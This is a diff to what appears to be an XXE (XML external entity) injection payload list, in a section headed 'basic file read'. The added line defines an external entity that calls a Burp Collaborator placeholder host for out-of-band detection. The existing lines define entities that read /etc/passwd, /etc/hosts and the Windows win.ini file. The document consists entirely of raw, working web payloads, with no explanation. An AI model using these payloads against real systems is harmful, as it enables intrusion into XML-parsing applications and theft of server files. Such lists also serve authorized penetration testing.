@@ -1,4 +1,5 @@
 <!-- ==================== PART 1: BASIC FILE READ ==================== -->
+<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> ]>
 <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
 <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini"> ]>
 <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hosts"> ]>
